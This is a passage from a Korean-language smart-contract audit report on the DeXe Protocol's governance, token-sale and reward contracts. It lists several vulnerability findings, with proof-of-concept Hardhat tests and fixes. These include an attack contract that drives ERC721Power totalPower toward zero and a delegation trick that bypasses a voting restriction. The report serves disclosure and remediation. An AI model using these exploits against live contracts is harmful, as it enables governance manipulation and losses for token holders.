**권장 완화 방법:** `libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol` [L115-120](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L115-L120)은 사용자가 현재 티어에서 이미 구매한 총액을 동일한 티어에서 구매 중인 현재 금액에 추가하고 이 총액이 `<= maxAllocationPerUser`인지 확인해야 합니다.

**Dexe:**
[PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-4cd963fe9cc6a9ca86a4c9a2dc8577b8c35f60690c9b9cbffca7a2b551dec99e)에서 수정되었습니다. 우리는 또한 `exchageRate` 작동 방식을 변경했습니다. 따라서 "구매 토큰당 판매 토큰 수"였지만 지금은 "판매 토큰당 구매 토큰 수"입니다.

**Cyfrin:** 확인됨; PoC 환율을 1:1로 변경했습니다.



### 악의적인 DAO Pool은 실제로 DAO 토큰을 전송하지 않고 토큰 판매 티어를 생성할 수 있음

**설명:** `TokenSaleProposalCreate::createTier`는 새 토큰 판매 티어를 생성하기 위해 DAO 풀 소유자에 의해 호출됩니다. 티어를 생성하기 위한 근본적인 전제 조건은 DAO 풀 소유자가 `totalTokenProvided` 금액의 DAO 토큰을 `TokenSaleProposal`로 전송해야 한다는 것입니다.

현재 구현은 `msg.sender(GovPool)`에서 `TokenSaleProposal` 계약으로 토큰을 전송하기 위해 저수준 호출(low-level call)을 구현합니다. 그러나 전송이 성공한 후 토큰 잔액을 검증하지 못합니다. "반환 값은 의도적으로 확인되지 않음"이라는 `dev` 주석이 있지만, 이 취약점은 반환 `status`를 확인하는 것과 관련이 있는 것이 아니라 호출 전후의 계약 잔액을 확인하는 것과 관련이 있습니다.

```solidity
function createTier(
        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,
        uint256 newTierId,
        ITokenSaleProposal.TierInitParams memory _tierInitParams
    ) external {

       ....
         /// @dev return value is not checked intentionally
  >      tierInitParams.saleTokenAddress.call(
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                msg.sender,
                address(this),
                totalTokenProvided
            )
        );  //@audit -> no check if the contract balance has increased proportional to the totalTokenProvided
   }
```

DAO 풀 소유자는 모든 ERC20을 DAO 토큰으로 사용할 수 있으므로, 악의적인 Gov Pool 소유자가 `transferFrom` 함수를 재정의하는 토큰의 사용자 정의 ERC20 구현을 구현할 수 있습니다. 이 함수는 실제로 기초 토큰을 전송하지 않고 성공적인 전송을 속이는 표준 ERC20 `transferFrom` 로직을 재정의할 수 있습니다.

**영향:** `TokenSaleProposal` 계약에 비례하는 DAO Pool 토큰 잔액 없이 가짜 티어를 생성할 수 있습니다. 순진한 사용자는 향후 날짜에 DAO 토큰 청구가 이행될 것이라고 가정하고 이러한 토큰 판매에 참여할 수 있습니다. 풀에 토큰 잔액이 불충분하므로 DAO 풀 토큰을 청구하려는 시도는 영구적인 DOS로 이어질 수 있습니다.

**권장 완화 방법:** 저수준 호출 전후의 계약 잔액을 계산하고 계정 잔액이 `totalTokenProvided`만큼 증가하는지 확인하십시오. 이 확인은 수수료가 없는 토큰(non-fee-on-transfer tokens)에 대해서만 유효하다는 점에 유의하십시오. 수수료가 있는 토큰의 경우 잔액 증가는 전송 수수료에 대해 추가로 조정되어야 합니다. 수수료가 없는 토큰에 대한 예제 코드:
```solidity
        // transfer sale tokens to TokenSaleProposal and validate the transfer
        IERC20 saleToken = IERC20(_tierInitParams.saleTokenAddress);

        // record balance before transfer in 18 decimals
        uint256 balanceBefore18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);

        // perform the transfer
        saleToken.safeTransferFrom(
            msg.sender,
            address(this),
            _tierInitParams.totalTokenProvided.from18Safe(_tierInitParams.saleTokenAddress)
        );

        // record balance after the transfer in 18 decimals
        uint256 balanceAfter18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);

        // verify that the transfer has actually occured to protect users from malicious
        // sale tokens that don't actually send the tokens for the token sale
        require(balanceAfter18 - balanceBefore18 == _tierInitParams.totalTokenProvided,
                "TSP: token sale proposal creation received incorrect amount of tokens"
        );
```

**Dexe:**
[PR177](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6)에서 수정되었습니다.

**Cyfrin:** 수정 사항은 `transferFrom`을 `safeTransferFrom`으로 사용하는 것으로 변경되었지만, 권장 사항은 올바른 양의 토큰이 실제로 전송되었는지 확인하기 위해 전송 전후의 실제 잔액을 확인할 것을 요구합니다.


### 공격자는 투표 제한을 우회하기 위해 위임을 사용하여 투표가 금지된 제안에 투표할 수 있음

**설명:** 공격자는 투표 제한을 우회하기 위해 위임을 사용하여 투표가 금지된 제안에 투표할 수 있습니다.

**영향:** 공격자는 투표가 제한된 제안에 투표할 수 있습니다.

**개념 증명 (Proof of Concept):** `describe("vote()", () => {` 섹션 아래의 `GovPool.test.js`에 PoC를 추가하십시오:
```javascript
      it("audit bypass user restriction on voting via delegation", async () => {
        let votingPower = wei("100000000000000000000");
        let proposalId  = 1;

        // create a proposal where SECOND is restricted from voting
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesUndelegateTreasury(SECOND, 1, [])]],
          []
        );

        // if SECOND tries to vote directly this fails
        await truffleAssert.reverts(
          govPool.vote(proposalId, true, votingPower, [], { from: SECOND }),
          "Gov: user restricted from voting in this proposal"
        );

        // SECOND has another address SLAVE which they control
        let SLAVE = await accounts(10);

        // SECOND delegates their voting power to SLAVE
        await govPool.delegate(SLAVE, votingPower, [], { from: SECOND });

        // SLAVE votes on the proposal; votes "0" as SLAVE has no
        // personal voting power, only the delegated power from SECOND
        await govPool.vote(proposalId, true, "0", [], { from: SLAVE });

        // verify SLAVE's voting
        assert.equal(
          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.MicropoolVote)).totalRawVoted,
          votingPower // delegated votes from SECOND now included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposalId, SLAVE, VoteType.PersonalVote))[0].toFixed(),
          votingPower // delegated votes from SECOND now included
        );

        // SECOND was able to abuse delegation to vote on a proposal they were
        // restricted from voting on.
      });
```

다음으로 실행: `npx hardhat test --grep "audit bypass user restriction on voting via delegation"`

**권장 완화 방법:** 공격자가 위임 시스템을 악용하여 투표가 금지된 제안에 투표할 수 없도록 투표 제한 메커니즘을 재작업하십시오.

**Dexe:**
[PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 위임자는 여러 위임이 있는 더 긴 제안에 대해 잘못된 더 적은 보상을 받음

**설명:** 위임 목록에서 [예상 보상을 검색](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157)하면 동일한 위임자가 동일한 피위임자에게 별도의 블록에 걸쳐 여러 번 위임이 발생하는 경우 전체 위임 금액을 검색하지 못하므로, 위임자는 여러 위임이 있는 더 긴 제안에 대해 잘못된 더 적은 보상을 받습니다.

**영향:** 위임자는 받아야 할 것보다 적은 보상을 받게 됩니다.

**개념 증명 (Proof of Concept):** 다음 시나리오를 고려하십시오:

지금부터 2개월 후 `endDate`를 가진 활성 기간이 더 긴 2개의 제안.

제안 1, 위임자가 피위임자에게 전체 투표권을 위임하고 피위임자가 투표하여 제안 1을 결정합니다. 제안 1이 실행되고, 피위임자와 위임자 모두 올바른 보상을 받습니다.

제안 2, 위임자가 피위임자에게 투표권의 절반을 위임하고 피위임자가 투표하지만 이 투표는 제안을 결정하기에 충분하지 않습니다. 1개월이 지나고 2개월 동안 진행되므로 제안은 여전히 활성 상태입니다.

위임자는 투표권의 나머지 절반을 피위임자에게 위임합니다. 이는 자동 `revoteDelegated`를 트리거하여 피위임자가 위임자의 전체 투표권으로 투표하게 되며 이는 제안 2를 결정하기에 충분합니다.

제안 2가 실행됩니다. 피위임자는 위임자의 전체 투표권을 사용한 것에 대해 전체 보상을 받지만, 위임자는 제안을 결정하는 데 사용된 전체 투표권을 위임했음에도 불구하고 받아야 할 보상의 *절반*만 받습니다.

여기서 더 흥미로운 점은; 두 번째 반파워 위임을 하는 대신 위임자가 남은 금액을 위임 해제한 다음 전체 금액을 위임하고 피위임자가 투표하면 위임자가 전체 보상을 받는다는 것입니다. 그러나 위임자가 1개월의 시간 간격을 두고 여러 번(2번의 트랜잭션) 위임하면 보상의 절반만 받습니다.

먼저 `describe("Fullfat GovPool", () => {` 섹션 아래의 `GovPool.test.js`에 이 도우미 함수를 추가하십시오:
```javascript
    async function changeInternalSettings2(validatorsVote, duration) {
      let GOV_POOL_SETTINGS = JSON.parse(JSON.stringify(POOL_PARAMETERS.settingsParams.proposalSettings[1]));
      GOV_POOL_SETTINGS.validatorsVote = validatorsVote;
      GOV_POOL_SETTINGS.duration = duration;

      await executeValidatorProposal(
        [
          [settings.address, 0, getBytesAddSettings([GOV_POOL_SETTINGS])],
          [settings.address, 0, getBytesChangeExecutors([govPool.address, settings.address], [4, 4])],
        ],
        []
      );
    }
```

그런 다음 `describe("getProposalState()", () => {` 섹션 아래의 `GovPool.test.js`에 PoC를 넣으십시오:
```javascript
      it("audit micropool rewards short-change delegator for long proposals with multiple delegations", async () => {
        // so proposals will be active in voting state for longer
        const WEEK = (30 * 24 * 60 * 60) / 4;
        const TWO_WEEKS = WEEK * 2;
        const MONTH = TWO_WEEKS * 2;
        const TWO_MONTHS = MONTH * 2;

        // so proposal doesn't need to go to validators
        await changeInternalSettings2(false, TWO_MONTHS);

        // required for executing the first 2 proposals
        await govPool.deposit(govPool.address, wei("200"), []);

        // create 4 proposals; only the first 2 will be executed
        // create proposal 1
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], false)]]
        );
        // create proposal 2
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 3
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 4
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );

        let proposal1Id = 2;
        let proposal2Id = 3;
        let DELEGATEE = await accounts(10);
        let DELEGATOR1 = await accounts(9);

        let delegator1Tokens = wei("200000000000000000000");
        let delegator1Half = wei("100000000000000000000");

        let delegateeReward = wei("40000000000000000000");
        let delegator1Reward = wei("160000000000000000000");

        // mint tokens & deposit them to have voting power
        await token.mint(DELEGATOR1, delegator1Tokens);
        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });
        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });

        // delegator1 delegates its total voting power to AUDITOR
        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });

        // DELEGATEE votes on the first proposal
        await govPool.vote(proposal1Id, true, "0", [], { from: DELEGATEE });

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // execute proposal 1
        await govPool.execute(proposal1Id);

        // verify pending rewards via GovPool::getPendingRewards()
        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        // delegator1 receives full reward for all tokens they delegated
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        // reward balances 0 before claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), "0");

        // claim rewards
        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });

        // verify reward balances after claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);

        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);

        // delegator1 undelegates half of its total voting power from DELEGATEE,
        // such that DELEGATEE only has half the voting power for second proposal
        await govPool.undelegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });

        // DELEGATEE votes on the second proposal for the first time using the first
        // half of DELEGATOR1's voting power. This isn't enough to decide the proposal
        await govPool.vote(proposal2Id, true, "0", [], { from: DELEGATEE });

        // time advances 1 month, proposal is a longer proposal so still in voting state
        await setTime((await getCurrentBlockTime()) + MONTH);

        // delegator1 delegates remaining half of its voting power to DELEGATEE
        // this cancels the previous vote and re-votes with the full voting power
        // which will be enough to decide the proposal
        await govPool.delegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);

        // execute proposal 2
        await govPool.execute(proposal2Id);

        // verify pending rewards via GovPool::getPendingRewards()
        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        // delegatee getting paid the full rewards for the total voting power
        // delegator1 delegated
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);

        // fails as delegator1 only paid half the rewards - not being paid for the
        // full amount it delegated!
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);
      });
```

실행: `npx hardhat test --grep "rewards short-change delegator for long proposals"`

**권장 완화 방법:** 동일한 위임자가 별도의 블록에서 동일한 피위임자에게 여러 번 위임할 때 전체 위임 금액이 검색되도록 `GovMicroPool`이 위임된 금액 목록에서 [예상 보상을 검색하는 방법](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157)을 변경하십시오.

**Dexe:**
[PR170](https://github.com/dexe-network/DeXe-Protocol/commit/02e0dde26343c98c7bb7211d7d42989daa6b742e)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 공격자가 언제든지 `ERC721Power::totalPower`를 0에 가깝게 극적으로 낮출 수 있음

**설명:** 공격자는 존재하지 않는 NFT에 대해 `ERC721Power::recalculateNftPower()` 및 `getNftPower()`를 호출할 수 있다는 점을 이용하여 무허가 공격 계약을 사용하여 언제든지 `ERC721Power::totalPower`를 0에 가깝게 극적으로 낮출 수 있습니다.

```solidity
function getNftPower(uint256 tokenId) public view override returns (uint256) {
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
    }

    // @audit 존재하지 않는 tokenId에 대해 0
    uint256 collateral = nftInfos[tokenId].currentCollateral;

    // nft의 담보를 기반으로 가능한 최소 전력 계산
    // @audit 존재하지 않는 tokenId에 대해 기본 maxPower 반환
    uint256 maxNftPower = getMaxPowerForNft(tokenId);
    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));
    minNftPower = maxNftPower.min(minNftPower);

    // 마지막 업데이트 및 현재 전력 가져오기. 또는 첫 번째 반복인 경우 기본값으로 설정
    // @audit 존재하지 않는 tokenId에 대해 둘 다 0
    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;
    uint256 currentPower = nftInfos[tokenId].currentPower;

    if (lastUpdate == 0) {
        lastUpdate = powerCalcStartTimestamp;
        // @audit currentPower는 maxNftPower로 설정됨.
        // 이는 존재하지 않는 tokenId에 대해서도 단지 기본 maxPower임!
        currentPower = maxNftPower;
    }

    // 감소량 계산
    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);
    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));
    uint256 newPotentialPower = currentPower - powerReduction;

    // @audit 존재하지 않는 tokenId에 대해 maxPower에서 약간 감소된
    // newPotentialPower 반환
    if (minNftPower <= newPotentialPower) {
        return newPotentialPower;
    }

    if (minNftPower <= currentPower) {
        return minNftPower;
    }

    return currentPower;
}

function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }

    // @audit 존재하지 않는 tokenId에 대해 newPower > 0
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit tokenId가 존재하지 않기 때문에 첫 번째 업데이트이므로,
    // totalPower에서 nft의 최대 전력이 차감됨
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit 그런 다음 totalPower는 newPower만큼 증가함. 여기서:
    // 0 < newPower < maxPower 이므로 totalPower가 순 감소함
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    nftInfo.currentPower = newPower;
}
```

**영향:** `ERC721Power::totalPower`가 0에 가깝게 낮아집니다. [`totalPower`는 스냅샷 생성 시 읽히며](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) [`GovUserKeeper::getNftsPowerInTokensBySnapshot()`의 제수(divisor)로 사용](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559)되므로, 이는 투표권을 인위적으로 늘리는 데 사용될 수 있습니다.

개별 NFT의 `currentPower`는 오직 감소만 가능하므로 `ERC721Power::totalPower`를 다시 증가시킬 수 없어 이 공격은 매우 치명적입니다. NFT 계약을 새 계약으로 교체하지 않는 한 이 공격을 "되돌릴" 방법이 없습니다.

**개념 증명 (Proof of Concept):** 공격 계약 `mock/utils/ERC721PowerAttack.sol` 추가:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // 이 공격은 ERC721Power::totalPower를 0에 가깝게 감소시킬 수 있음
    //
    // 이 공격은 block.timestamp > nftPower.powerCalcStartTimestamp일 때
    // 존재하지 않는 nft에 대해 recalculateNftPower를 호출하여 작동함
    function attack2(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId,
        uint256 attackIterations
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // 올바른 블록에서 공격이 시작되는지 확인
        require(
            block.timestamp > nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack2 requires block.timestamp > nftPower.powerCalcStartTimestamp"
        );

        // 시작 블록에서 totalPower()가 올바른지 확인
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // 공격 전 totalPower 출력
        console.log(nftPower.totalPower());

        // 존재하지 않는 nft에 대해 recalculateNftPower() 계속 호출
        // 이는 매번 ERC721Power::totalPower()를 낮춤
        // 언더플로 때문에 0으로 만들 수는 없지만 충분히 가깝게 만들 수 있음
        for (uint256 i; i < attackIterations; ) {
            nftPower.recalculateNftPower(++lastTokenId);
            unchecked {
                ++i;
            }
        }

        // 공격 후 totalPower 출력
        console.log(nftPower.totalPower());

        // original totalPower : 10000000000000000000000000000
        // current  totalPower : 900000000000000000000000000
        require(
            nftPower.totalPower() == 900000000000000000000000000,
            "ERC721PowerAttack: after attack finished totalPower should equal 900000000000000000000000000"
        );
    }
}
```

테스트 하네스를 `ERC721Power.test.js`에 추가:
```javascript
    describe("audit attacker can manipulate ERC721Power totalPower", () => {
      it("audit attack 2 dramatically lowers ERC721Power totalPower", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to just after the start of power calculation
        await setTime(powerCalcStartTime);

        // launch the attack
        await attackContract.attack2(nft.address, maxPowerPerNft.times(10).toFixed(), 10, 91);
      });
    });
```

다음으로 공격 실행: `npx hardhat test --grep "audit attack 2 dramatically lowers ERC721Power totalPower"`

**권장 완화 방법:** `ERC721Power::recalculateNftPower()`는 존재하지 않는 NFT에 대해 호출될 때 되돌려야(revert) 합니다.

**Dexe:**
[PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `DistributionProposal`의 '찬성(for)' 투표자 보상이 '반대(against)' 투표자에 의해 희석되고 누락된 보상이 `DistributionProposal` 계약에 영구적으로 갇힘

**설명:** `DistributionProposal`은 "반대"가 아닌 ["찬성" 투표를 한 사용자에게만 보상을 지급합니다](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L115-L117).

그러나 [보상 계산 시](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L119-L123) `DistributionProposal::getPotentialReward()`의 제수는 `coreRawVotesFor + coreRawVotesAgainst`로, 비록 "반대" 투표가 보상에서 제외되더라도 "찬성"과 "반대"의 모든 투표 합계입니다.

이로 인해 "반대" 투표자는 보상 자격이 없음에도 불구하고 "찬성" 투표자에 대한 보상이 "반대" 투표자에 의해 희석됩니다. 누락된 보상은 `DistributionProposal` 계약 내부에 영구적으로 갇혀 지급될 수 없게 됩니다.

새로운 `DistributionProposal`을 생성하여 보상을 회수하려 해도 보상이 기존 `DistributionProposal` 계약 내부에 갇혀 있어 실패합니다. 기존 `DistributionProposal` 계약을 사용하여 새로운 두 번째 "구조(rescue)" 제안 `secondProposalId`를 생성하려는 시도 또한 실패합니다. 그 이유는 다음과 같습니다:

1) `DistributionProposal::execute()`는 `amount > 0`을 [요구하며](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L58) 해당 금액을 계약으로 [전송하므로](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L65), `newRewardAmount`로 다시 자금을 조달해야 합니다.

2) `DistributionProposal::execute()`는 `proposals[secondProposalId].rewardAmount = newRewardAmount`를 [설정합니다](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67).

3) `DistributionProposal::claim()`은 `secondProposalId`와 함께 [호출되어야 하며](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L71), 이는 사용자가 받을 보상을 계산하기 위해 이 `newRewardAmount`를 [사용하는](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L120) `DistributionProposal::getPotentialReward()`를 호출합니다.

따라서 이 전략으로는 첫 번째 제안에서 지급되지 않은 금액을 구조하는 것이 불가능해 보입니다. `DistributionProposal` 계약에서 지급되지 않은 토큰을 회수할 메커니즘이 없는 것으로 보입니다.

**영향:** "찬성" 투표자와 "반대" 투표자가 모두 있는 모든 제안에서, "찬성" 투표자에게 지급되는 `DistributionProposal` 보상은 `DistributionProposal` 계약이 보유한 총 보상 금액보다 적을 것이며, 누락된 잔액은 `DistributionProposal` 계약 내부에 영구적으로 갇히게 됩니다.

**개념 증명 (Proof of Concept):** `DistributionProposal.test.js`의 `describe("claim()", () => {` 섹션 아래에 PoC 추가:
```javascript
      it("audit for voter rewards diluted by against voter, remaining rewards permanently stuck in DistributionProposal contract", async () => {
        let rewardAmount = wei("10");
        let halfRewardAmount = wei("5");

        // mint reward tokens to sending address
        await token.mint(govPool.address, rewardAmount);

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [token.address, 0, getBytesApprove(dp.address, rewardAmount)],
            [dp.address, 0, getBytesDistributionProposal(1, token.address, rewardAmount)],
          ],
          [],
          { from: SECOND }
        );

        // only 1 vote "for" by SECOND who should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });
        // but THIRD votes "against", these votes are excluded from getting the reward
        await govPool.vote(1, false, 0, [6], { from: THIRD });

        // fully fund the proposal using erc20 token
        await impersonate(govPool.address);
        await token.approve(dp.address, rewardAmount, { from: govPool.address });
        await dp.execute(1, token.address, rewardAmount, { from: govPool.address });

        // verify SECOND has received no reward
        assert.equal((await token.balanceOf(SECOND)).toFixed(), "0");

        // claiming the reward releases the erc20 tokens
        await dp.claim(SECOND, [1]);

        // SECOND only receives half the total reward as the reward is diluted
        // by the "against" vote, even though that vote is excluded from the reward.
        // as a consequence only half of the reward is paid out to the "for" voter when
        // they should get 100% of the reward since they were the only "for" voter and
        // only "for" votes qualify for rewards
        assert.equal((await token.balanceOf(SECOND)).toFixed(), halfRewardAmount);

        // the remaining half of the reward is permanently stuck
        // inside the DistributionProposal contract!
        assert.equal((await token.balanceOf(dp.address)).toFixed(), halfRewardAmount);
      });
```

실행: `npx hardhat test --grep "audit for voter rewards diluted by against voter"`

**권장 완화 방법:** 다음 옵션 중 하나를 고려하십시오:

a) [보상 계산 제수](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122)를 `coreRawVotesFor`만 사용하도록 변경하십시오.

b) 의도적인 설계가 "반대" 투표자가 "찬성" 투표자의 보상을 희석시키는 것이라면, 지급되지 않은 토큰을 `DistributionProposal` 계약에서 `GovPool` 계약으로 환불하는 메커니즘을 구현하십시오. 이는 `DistributionProposal::execute()` 내에서 다음과 같은 프로세스를 사용하여 수행할 수 있습니다:

1) `againstDilutionAmount` 계산
2) `proposal.rewardAmount = amount - againstDilutionAmount` 설정
3) `againstDilutionAmount`를 `govPool`로 환불
4) [보상 계산 제수](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122)를 `coreRawVotesFor`만 사용하도록 변경

참고: 2)는 계약이 실제로 받은 금액을 입력 금액 대신 계산하고 사용해야 하므로 fee-on-transfer 토큰을 지원하려는 경우 약간 더 복잡해집니다.

**Dexe:**
[PR174](https://github.com/dexe-network/DeXe-Protocol/commit/a143871ed0ac7184aca9e385363eb7d72eaef190)에서 수정되었습니다.

